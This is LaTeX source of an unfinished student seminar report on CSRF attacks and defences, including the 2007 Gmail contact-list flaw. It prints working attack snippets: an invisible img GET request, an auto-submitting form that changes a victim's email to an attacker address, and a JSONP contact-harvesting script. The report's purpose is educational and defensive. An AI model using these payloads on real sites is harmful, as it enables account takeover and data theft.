\documentclass[a4paper,11pt,openany]{report}
\usepackage[utf8]{inputenc}
\usepackage[english]{babel}
\usepackage[font=small,labelfont=bf, textfont=it]{caption}
%\usepackage[bottom=2cm, left=2.5cm, right=2.5cm]{geometry} % to change padding
\usepackage{verbatim}
\usepackage{subcaption} % for multi figure
\usepackage{enumitem} % -- label item
\usepackage{tabularx}
\usepackage{color}
\usepackage[usenames, dvipsnames]{xcolor} % color
\usepackage[framemethod=TikZ]{mdframed} % box
\usepackage{listings} % code
\usepackage{minted} % code
%\usepackage{amsmath} % align* maths
\usepackage{wrapfig}
\usepackage[section]{placeins} % float inside subsection
\usepackage[bookmarks, hidelinks]{hyperref} % clickable links
\usepackage{graphicx} % includegraphics
\usepackage{indentfirst}

\setlength\parindent{0pt}
\setlength{\parskip}{1em}

\renewcommand\thesection{\arabic{section}} % start section from 1
\setcounter{tocdepth}{2} % display subsection
\setcounter{secnumdepth}{3} % number subsubsection

% \title{Internet Security \& Privacy\\Seminar -- Report\\\vspace{10pt}\textbf{CSRF attack: even Google was vulnerable.}}
% \author{Quentin Lemaire \& David Kufa\\Group 26}

\newcommand{\csrf}{\textit{Cross-Site Request Forgery}}


\begin{document}

  % first page
 \begin{titlepage}
  \centering
  \vspace*{\stretch{1}}
  \vfill
    {\bfseries\Large{
	Internet Security \& Privacy\\
	Seminar -- Report}
    }    
  \vfill
  \vfill
    \Huge{\textsc{CSRF attack: even Google was vulnerable.}}
  \vfill
      \Large{\textsc{David Kufa} \& \textsc{Quentin Lemaire}}
    \\
  \vspace{0.4cm}
    Group 26
  \vfill
  \vfill
    % \includegraphics[width=0.22\textwidth]{kth.jpg}
    KTH Royal Institute of Technology
  \vfill
    \today
  \vspace*{\stretch{1}}
\end{titlepage}

% abstract
\begin{abstract}
  \csrf{} (CSRF) -- often spelled ``sea surf'' -- is a well-known web attack which has 
  been discovered in 2001. The \textit{Open Web Application Security Project} (OWASP \cite{owasp}) 
  ranked CSRF as the 8th\footnote{In 2007 \& 2010 OWASP's tops ten, CSRF was at the 5th position 
  (\url{https://www.owasp.org/index.php/Top_10_2007} \& \url{https://www.owasp.org/index.php/Top_10_2010}).} 
  vulnerability in the top 10 of the most critical web application security risks in 2013~\cite{owasp_top_ten}.
  
  CSRF attacks consists of creating (forging) fake HTTP or HTTPS\footnote{TLS encrypts 
  information between the client (browser) and the server in order to prevent sniffing 
  in untrusted networks and man in the middle attacks but it doesn't protect from 
  legitimate requests.} requests on the user's behalf. It utilizes the lack of knowledge 
  of the victim to build the request and get information with their credentials (as if 
  the user really wanted to execute this request). In order to succeed, the victim must 
  be connected (authenticated) to the service (website) where the vulnerability is located. 
  Then, an attacker will have to fool the victim in order to build the fake request (with 
  social engineering for instance).
  
  During this seminar we wanted to get a better understanding of the security breaches 
  involved in CSRF attack. Our first and most interesting part was the comprehension of 
  the surface of an attack: how can it be done and where does it come from. It 
  was also important to understand what kind of information an attacker could steal or 
  affect on the user's behalf thanks to this attack. Furthermore, it was relevant to study 
  different ways of detecting the vulnerability and how to protect web servers from this 
  attack.
  
  In our second part we focused our attention on concrete applications of CSRF vulnerabilities. 
  Lots of companies were affected in the past and we decided to deal with Google's well-known 
  stories about CSRF. Two different vulnerabilities were discovered in 2007 concerning 
  Google's \footnote{\url{https://mail.google.com/}} email service Gmail.
  
  Finally, we implemented a small webapp with different services, either vulnerable or protected, 
  from CSRF attack. This webapp featured an attacker website (both developed from scratch), 
  the outline of different practical examples of the attack and different ways to prevent it.
  \end{abstract}
  
%   \begin{enumerate}
%    \item CSRF: how it works ? Implementation of a vulnerable web service.
%    \item CSRF: how to prevent it ? Implementation of a protected web service with different methods of protection.
%    \item Some stories about CSRF: 2 Google vulnerabilities in 2007.
%    \begin{itemize}
%     \item Contact list spoofing: it was possible to retrieve all the contact list of an user~\cite{gmail_contact_list_csrf, gmail_contact_list_csrf2}.
%     \item Email filter hijacking: it was possible to forward all email of an user to another selected email address~\cite{gmail_hijack_csrf, gmail_hijack_csrf2}. This attack had a great impact on Gmail users trust.
%    \end{itemize}
%   \end{enumerate}

\tableofcontents{} % toc
\clearpage % leave a page
\setcounter{page}{1} % init counter page

  % TODO part1: overview of CSRF
  % TODO     * Description & Identification
  % TODO     * Exploitation
  % TODO     * Recommandations: how to prevent CSRF ?
  
  % TODO part2: Google stories: how ? impact ?
  % TODO     * Contact list spoofing
  % TODO     * Email filter hijacking

  \section{Introduction}
  This report is split in two different parts. Firstly, it deals with \csrf{} (CSRF) attacks in 
  a theoretical and practical way. Academic examples and explanations describe and explore 
  different aspects and subtilities of CSRF attack. Secondly, this report deals with concrete 
  scenarios (in ``real life'') of CSRF breaches with two use cases about Google Gmail service.

  \section{Overview of CSRF}
  For each kind of WEB vulnerability, it is important to know how to detect and prevent them. 
  We will explain in more details what a CSRF attack is, how to identify and exploit CSRF 
  vulnerable services and finally how to protect these services. 
  Every explanation will be followed with examples from our own developed web application. 
  This application provides different services in order to manage and store a list of 
  interests (hobbies). More explanations from the technical documentation can be found 
  in appendix~\ref{app:practical_documentation}.
  
  \subsection{Description}
  \csrf{} attacks consists of creating (forging) fake HTTP(S) requests on an authenticated 
  user's behalf. It utilizes the lack of knowledge of the victim (user) and a breach in 
  the vulnerable website to build the request with credentials (cookies) of the victim. This 
  request can execute actions such as email changing, posting message, account deletion, etc.
  In order to succeed, the victim must be connected (authenticated) to the vulnerable website. 
  An attacker will have to fool a victim that is currently connected to forge the fake request, 
  e.g. with social engineering or cross-site scripting (XSS)\cite{wikipedia_xss} vulnerability.
  
  \subsection{Exploitation}
  Figure~\ref{figure:csrf_scenario} displays a typical CSRF attack scenario with 3 actors: a 
  user (the victim), a vulnerable web server and an attacker web server. Each step of the 
  scenario are described here:
  \begin{enumerate}
   \item The victim authenticates to the vulnerable web server with his or her credentials (most 
   of the time, a login and a password).
   \item The web server authenticates the client and sets a cookie on both the server and the client (browser).
   \item The victim is browsing the web, reading some articles for instance. Finally, he or 
   she visits the attacker website. It is usually done with malicious email or XSS vulnerability 
   on another website.
   \item The attacker website answers with a page containing malicious HTML code (often with 
   JavaScript). The browser interprets the HTML and JavaScript code and requests different URIs like 
   ``img'' HTML tags with an HTTP GET request. It is also possible to execute POST requests with 
   JavaScript as shown in Appendix~\ref{app:csrf_attack}.
   \item Forged request (probably executing actions) is made with victim's credentials.
  \end{enumerate}
  
\begin{figure}[h!t]
  \begin{center}
    \fbox{\includegraphics[width=.9\linewidth]{schemes/CSRF_attack.png}}
    \caption{
      CSRF attack scenario. Diagram realized with Dia (\url{https://wiki.gnome.org/Apps/Dia/}).
    }
    \label{figure:csrf_scenario}
  \end{center}
\end{figure}
  
  \subsection{How to prevent it ?}
  Websites are often vulnerable because of the lack of knowledge from developers. An attacker is able 
  to forge a request because he or she is able to find (retro-engineering) the needed parameters in 
  order to make the victim execute an HTTP request. Small tricks like one-time tokens or one-time 
  challenges allows developers to protect their website from CSRF attacks. The attacker won't be able 
  to find the needed parameters anymore.
  
  \subsubsection{Tokens}
  
  \paragraph{Session token}
  It is possible to use a session token which is a ``random'' number, generated at the beginning 
  of a user's session (authentication). The token is sent by the server in every forms (for POST 
  requests) as a hidden HTML input (as shown in figure~\ref{figure:session_token_client}) or URL 
  (for GET requests) as a parameter. This number must be sent by the browser in every request in 
  order to achieve a service. In order to avoid replay attacks, it is important to change this token 
  after each use of service. Tokens must be stored in the user's session on the server to check its 
  validity (as shown in figure~\ref{figure:session_token_server}).
  
  \begin{figure}[h!t]
  \begin{minted}[linenos]{html}
<form method="POST" action="?p=account&action=delete">
    <input type="hidden" name="csrf_token" value="5XWla[...]hHNPpXs=" />
    <input type="submit" value="I'm sure I want to delete my account" />
</form>
  \end{minted}
  \caption{Example of a session token (client side)}
  \label{figure:session_token_client}
  \end{figure}
  
  \begin{figure}[h!t]
  \begin{minted}[linenos]{php}
<?php
$token = $_POST['csrf_token'];
$valid_request = $token === $_SESSION['token'];
?>
  \end{minted}
  \caption{Code to check session token (server side)}
  \label{figure:session_token_server}
  \end{figure}
  
  \paragraph{Signed token} % show code as example (using HMAC)
  It is possible to use a Hash based Message Authentication Code (HMAC) in order to ``sign'' 
  generated tokens. With a private secret only known by the server, tokens are signed using 
  HMAC and this hash is concatenated to the token before sending it to the user (in a hidden 
  HTML input as shown in figure~\ref{figure:signed_token_client}). This signed token avoids 
  storage of tokens in session but the method has several drawbacks like ``golden'' token. 
  Indeed, if the token is stolen (somehow), it can be reused on the user's behalf. In order 
  to prevent these type of events, it is possible to append a timestamp (time to leave) after 
  the token value. HMAC will protect the timestamp from modification (integrity 
  check) so there is no need to encrypt it. An example to build and check tokens is displayed 
  in figure~\ref{figure:signed_token_server}.
  
  \begin{figure}[h!t]
  \begin{minted}[linenos]{html}
<form method="POST" action="?p=interests&action=add">
    <input type="hidden" name="csrf_token" 
        value="WQJCXDUivLPd1r5OLW[...]OYdw==$f75bfabe1[...]04394e6b" />
    [...]
    <input type="submit" value="Create interest" />
</form>
  \end{minted}
  \caption{Example of a signed token (client side). The value is split in 2 parts: the first part 
  (before \$ symbol) contains the token. The second part (after \$ symbol), there is the HMAC which 
  will let the server check integrity of the token.}
  \label{figure:signed_token_client}
  \end{figure}
  
  \begin{figure}[ht!]
  \begin{minted}[linenos]{PHP}
<?php
const SECRET_KEY = 'a0e605ee21f0b7bdd85ff2edb8177dcf'; // 16 bytes key
const SEPARATOR = '$'; // not base64 chars i.e. not from [0-9a-zA-Z/=+]

public static function generate_signed_token($size = 64) {
    $token = self::generate_token($size); // base64 token
    $signed_token = self::sign_token($token);
    return $token . self::SEPARATOR . $signed_token;
}

private static function sign_token($token) {
    return hash_hmac('sha512', $token, self::SECRET_KEY);
}
  
public static function check_signed_token($received_token) {
    list($token, $signature) = explode(self::SEPARATOR, $received_token); // split
    $signed_received_token = self::sign_token($token); // sign received token
    return $signature === $signed_received_token; // compare with signature
}
?>
  \end{minted}
  \caption{Code to check a signed token (server side).}
  \label{figure:signed_token_server}
  \end{figure}
  
  \subsubsection{Challenges}
  
  \paragraph{Double authentication}
  For each critical service, it is common use to add a double authentication as a confirmation 
  before executing the action. For instance, in GitHub~\cite{github}, when one wants to add a new 
  SSH public key to authenticate on GitHub server, he or she has to retype the password to 
  re-authenticate and prevent CSRF attack.
  
  \paragraph{CAPTCHA}
  Another challenge, similar to double authentication, consists of the confirmation of the requests 
  through the insertion of a one-time text within an image. This technique is known as CAPTCHA
  \footnote{CAPTCHA stands for ``Completely Automated Public Turing test to tell Computers and 
  Humans Apart''} and is mostly used to prevent robots from scanning the web and executing spam 
  requests.
  
  \subsubsection{Check referrer}
  Another protection against CSRF attacks is to check \textit{HTTP-REFERER} which is the URL of the 
  website where the request comes from. This value comes from the client but it isn't easy nay impossible 
  to forge from a third party website. A problem remains with this technique: lots of browsers and HTTP 
  clients alter or remove this value within the HTTP request. Thus, this is impossible to use in order 
  to protect the website from CSRF without having features removed due to those clients.
   
  \subsubsection{Other protections}  
  Recommendations described above are not exhaustive. It is possible to combine them in order to increase 
  the security of the application against CSRF attacks. Nowadays lots of web development frameworks provide 
  CSRF protecting tools and it is absolutely recommended to use them in production environment.
  
  Furthermore, it is important to tell users they have an important role to play to prevent these attacks. 
  With common gestures (actions) like logging out of websites when done with them, having different browsers 
  for trusted and not trusted websites, using ``NoScript''\footnote{\url{https://noscript.net/}} extension to 
  avoid JavaScript to be executed by untrusted websites, etc. it is possible to avoid such risks.
  
  \section{Google, vulnerable to CSRF in 2007}
  One of today's most renowned company in the world[1] was seriously harmed in 2007. During one single year, 
  Google was subject to not one, but two CSRF attacks. The attackers had no problems abusing security 
  vulnerabilities in Google's newly released email service: Gmail. Although Gmail has been around in a beta 
  environment since 2004, it wasn't until 2007 it was released to the public. It was a year when CSRF went from 
  being an unknown threat with scarce prevention across the web to something that would appear on the wallpaper 
  several years later.
  
  CSRF attacks are always serious but the two attacks differentiated in that one could only gather information 
  while the other one could hijack the email. The latter was a much more serious threat as it could ultimately end 
  with losing one's account. Since then, these particular events are often used in educational contexts to help 
  demonstrating CSRF. 

References: (just letting them be here for the moment)
[1] Forbes - The world's most valuable brands. http://www.forbes.com/powerful-brands/. Accessed: 2015-11-24.
[1 alt.] Infegy - Top 50 most popular brands. http://top50.infegy.com/. Accessed: 2015-11-24.
  
  \subsection{Contact list spoofing}
  It was around the beginning of 2007 that the public got information about CSRF attacks on Gmail. The CSRF 
  attack involved theft of users' contact lists and it was hot news on the Internet as well as in papers. The 
  aim of this attack was to gather email addresses that could be targeted by spam and phishing services.
  Successfully stolen contact lists could not be detected by the users as the attackers did not actually steal
  anything. The result was clueless users that didn't know if they were affected until their colleagues and 
  friends started reporting about weird emails and spam issues.
  
  One have to realize that email spoofing exists even today. Large email services like Gmail and Outlook have
  complex algorithms to tackle this problem to a certain extent. These algorithms were far as advanced in 2007 as 
  they are today. Spamming was a troublesome problem and phishing was very efficient in fooling people, especially 
  the older technology generation.
  
  The security around the contact list was breached because of negligence from the development team. Although
  some of the attacks succeeded, Google could correct the problem rather quickly [2].
  
[2] O'Reilly - GMail CSRF flaw fixed. http://archive.oreilly.com/pub/post/gmail_exploit_contact_list_hij.html. Accessed: 2015-11-23.

  \subsubsection{Exploitation}
  The basics of a CSRF scenario applies here:
  \begin{enumerate}
   \item The victim authenticates to Gmail with his or her credentials. At that time there existed an auto login
   that kept the cookie active, for almost an unlimited time, to any Google service.
   \item (As most users were already logged in, they could simply browse the web right off the bat.)
   \item The victim is browsing the web, accessing the attacker website. 
   \item The attacker website answers with a page containing malicious HTML code with JavaScript.
   \item Forged request is made, , calling the google function found in Picture 6. %%% <-- Has to be something dynamical
   \item (Extra) Attacker receives object with email contacts. %% Maybe not useful
  \end{enumerate}
  
  What made this possible was the server's verification scheme: it was only verifying that the caller was logged in 
  to a Google account. The ever active cookie declared it without hesitation which led to a successful attack.
  To make it even worse, the server didn't check if the call came from the same webpage[3]. A simple popup window could 
  have triggered this attack.
  
  % Reference to code: 
  % [3] http://incompleteness.me/blog/2007/01/01/csrf-attacks-or-how-to-avoid-exposing-your-gmail-contacts/
  % Accessed: 2015-11-26
  % Alternative ref: 
  % [4] http://ajaxian.com/archives/gmail-csrf-security-flaw
  % Accessed: 2015-11-24
  % It's neither of these sites code, it is Google's code. But we might have to quote it anyway.
  \begin{figure}[h!t]
  \begin{minted}[linenos]{JS} % JS = JavaScript
  google ({
  	Success: true,
  	Errors: [],
  	Body: {
      AuthToken: {
      	Value: '********'
    },
    Contacts: [
      {
        Id: '***',
        Email: 'users at dwr.dev.java.net',
        Affinity: ***,
        Groups: [
          {
            id: '^Freq',
            value: 'users at dwr.dev.java.net'
          }
        ],
        Addressess: [],
        Phoness: [],
        Imss: []
      },
    // Lots more contacts here
    ]
  	}
  })
  \end{minted}
  \caption{The JavaScript callback function that returned a data structure (object) with all email contacts.[2]}
  \label{figure:signed_token_server}
  \end{figure}
  
  As you can see in Picture 6, several fields were accessible. The affinity field told the attacker how important 
  the contact was to that user, making it a more vulnerable target for phishing attempts[2]. 
  
  \begin{figure}[h!t]
  \begin{minted}[linenos]{JS} % JS = JavaScript
  <script type="text/javascript">
	function google(data){
      var emails, i;
      for (i = 0; i < data.Body.Contacts.length; i++) {
        mails += "<li>" + data.Body.Contacts[i].Email + "";
      }
      document.write("<ol>" + emails + "</ol>");
	}
  </script>
 
  <script type="text/javascript" src="http://docs.google.com/data/contacts?out=js&show=ALL&psort=Affinity&callback=google&max=99999">
  </script>
  \end{minted}
  \caption{A simple JavaScript that calls the function in Picture 6 and writes the received data to a file.}
  \label{figure:signed_token_server}
  \end{figure}
  
  The code in Picture 7 does a very basic operation. The attacker could as well send the data to another program 
  that would for instance spam all contacts in the list or creating network connections for better relevance in 
  phishing attempts.
  
  \subsubsection{Impact}
  Starting a new service with problems is not a winning concept. Potential future users were thinking if Gmail 
  really was the best choice, especially when Microsoft initiated Outlook 2007 set up for Hotmail accounts. 
  But the final result was that it didn't have such a huge impact as Google managed to fix the problem relatively
  quickly.
  
  
  \subsection{Email filter hijacking}
  % TODO
  
  \subsubsection{Exploitation}
  % TODO
  
  \subsubsection{Impact}
  % TODO
  
  \subsection{Comparison}
  % TODO
  
  
  
  \section{Conclusion}
  % TODO conclusion

  
  % TODO all \nocite{}
  
% appendix
\appendix
\addtocontents{toc}{\protect\setcounter{tocdepth}{-1}}

\chapter{Practical documentation} \label{app:practical_documentation}

\section{Introduction}
The developed webapp is a small web application delivering different features 
in order to store and manage a list of interests. It provides authentication and 
interests-management. It has been developed from scratch with \textit{Apache 
WEB server 2.4}\footnote{\url{https://httpd.apache.org/}} and \textit{PHP 5.6}. 
The database used is \textit{MySQL 5.5}\footnote{\url{http://www.mysql.com/}} with 
\textit{InnoDB} engine.

\section{Specifications}

\subsection{Description}

In this web application, users can register and log in from their browser. As soon as 
they registered with an account, password and email, they are able to connect to 
the application. Once connected, the user has different possibilities. He or she can 
change their account settings, like the email attached to their account. A service lets the 
user delete his or her account. He or she can also add new interest to their list of 
interests. An interest is composed of a name and a description which is optional. It is 
possible to remove interests from the list (unbind) and add (bind) as many interests as 
possible.

Some services are protected from CSRF attack and some aren't. An exhaustive list of implemented 
services is described below.

\subsection{Services}

Different entities are parts of the web application's model. Here is an exhaustive list of implemented 
services, each one of them are prefixed with either ``[public]'' or ``[private]''. ``[public]'' means that 
service is accessible from the web (with a URI) and ``[private]'' means that service is not accessible from 
the web.
\begin{description}
 \item[User] this entity provides functions and methods related to user management
 \begin{itemize}[label=--]
  \item {[}public{]} Register a user with a login, a password and an email
  \item {[}public{]} Login a user with a couple (login, password)
  \item {[}private{]} Check \& hash password
  \item {[}public{]} Change user's email: \color{red}{vulnerable to CSRF attack}\color{black}{}
  \item {[}public{]} Disconnect the user
  \item {[}public{]} Delete user account: \color{green}{protected against CSRF attack}\color{black}{}
 \end{itemize}
 
 \item[Interest] this entity provides functions and methods related to interest management:
 \begin{itemize}[label=--]
  \item {[}public{]} Add an interest: \color{green}{protected against CSRF attack}\color{black}{}
  \item {[}public{]} Remove an interest: \color{red}{vulnerable to CSRF attack}\color{black}{}
  \item {[}private{]} Bind an interest with a user
  \item {[}private{]} Unbind an interest with a user
  \item {[}public{]} Get user's interests
  \item {[}private{]} Get all interests
 \end{itemize}

 \item[CSRF] this entity is not directly related to the web application but it contains the 
 implementation of CSRF protection functions and attributes:
 \begin{itemize}[label=--]
  \item {[}private{]} Secret key
  \item {[}private{]} Generate token
  \item {[}private{]} Check token
  \item {[}private{]} Sign token
  \item {[}private{]} Generate a signed token
  \item {[}private{]} Check a signed token
 \end{itemize}

\end{description}

\subsection{Database}
The database schema is composed of the two main entities of the web application:
\begin{itemize}
 \item Users
 \item Interests
\end{itemize}
Each attributes, table names and relations are defined in figure~\ref{figure:database}.

\begin{figure}[h!t]
  % trim=left bottom right top
  \includegraphics[trim=0 200 0 110,clip,width=\textwidth]{database.pdf}
  \caption{Database diagram. Arrows represent foreign keys. Extra information: ``login'' in ``Users'' table is UNIQUE.}
  \label{figure:database}
\end{figure}
  
\chapter{Examples of malicious HTML code} \label{app:csrf_attack}

\begin{figure}[h!t]
  \begin{minted}[linenos]{html}
<p>Take a look at my picture:<br />
<img src="http://vulnerable_site.com/?p=interests&action=remove&id=12" 
    width=0 height=0 /> <!-- Invisible GET request-->
<img src="http://real_image.png" alt="My image" />
  \end{minted}
  \caption{%
  Example of CSRF attack forging a GET HTTP request. Browser will execute the following GET request:\\
  ``GET http://vulnerable\_site.com/?p=interests\&action=remove\&id=12''\\
  This request will be totally invisible for the victim and this will remove one of his or her interest.
  }
  \label{figure:get_request}
\end{figure}

\begin{figure}[h!t]
  \begin{minted}[linenos]{html}
<form name="hackForm" method="POST" 
    action="http://vulnerable_site.com/?p=account&action=email">
        <input type="hidden" name="email" value="mail@attacker.com">
</form>
<script type="text/javascript">
    document.hackForm.submit(); // submit form
</script>
  \end{minted}
  \caption{%
  Example of CSRF attack forging a POST HTTP request. Execution of JavaScript is needed.
  This request won't be invisible for the victim but still, it will forge a request to change 
  the email of the victim in the vulnerable website. If the attacker is faster than the victim, he 
  or she can retrieve the account with the feature ``Retrieve my password''.
  }
  \label{figure:post_request}
\end{figure}
  

\chapter{Web application's screenshots} \label{app:screenshots}

\begin{figure}[ht!]
  \begin{center}
    \fbox{\includegraphics[width=.9\linewidth]{screens/login.png}}
    \caption{Login page}
    \label{figure:login}
  \end{center}
\end{figure}

\begin{figure}[ht!]
  \begin{center}
    \fbox{\includegraphics[width=.9\linewidth]{screens/register.png}}
    \caption{Register page}
    \label{figure:register}
  \end{center}
\end{figure}
  
\begin{figure}[ht!]
  \begin{center}
    \fbox{\includegraphics[width=.9\linewidth]{screens/interests.png}}
    \caption{Interests page}
    \label{figure:interests}
  \end{center}
\end{figure}
  
\begin{figure}[ht!]
  \begin{center}
    \fbox{\includegraphics[width=.9\linewidth]{screens/account.png}}
    \caption{Account page}
    \label{figure:account}
  \end{center}
\end{figure}
  
% bibliography
\bibliographystyle{plainurl}
\bibliography{references}

\end{document}